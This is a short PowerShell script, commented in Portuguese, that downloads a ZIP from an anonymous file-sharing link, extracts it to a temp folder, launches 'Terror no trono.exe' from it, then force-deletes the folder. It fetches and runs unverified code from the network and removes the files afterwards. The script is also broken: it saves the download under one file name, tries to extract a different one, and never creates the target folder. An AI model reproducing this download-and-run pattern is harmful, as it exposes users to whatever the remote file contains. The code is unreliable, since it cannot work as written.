# Define o URL do arquivo ZIP
$zipUrl = "https://filetransfer.io/data-package/eeML0ZKe/download"

# Define o caminho para onde você deseja extrair o arquivo ZIP
$destinationPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "TerrorNoTrono")

# Faz o download do arquivo ZIP
Invoke-WebRequest -Uri $zipUrl -OutFile "$destinationPath\Terror no trono.zip"

# Extrai o arquivo ZIP
Expand-Archive -Path "$destinationPath\arquivo.zip" -DestinationPath $destinationPath

# Define o caminho para o executável
$executablePath = [System.IO.Path]::Combine($destinationPath, "Terror no trono", "Terror no trono.exe")

# Executa o arquivo executável
Start-Process -FilePath $executablePath

# Aguarda até que o processo seja concluído (opcional)
Wait-Process -Name "Terror no trono"

# Limpa os arquivos temporários (opcional)
Remove-Item -Path "$destinationPath" -Recurse -Force
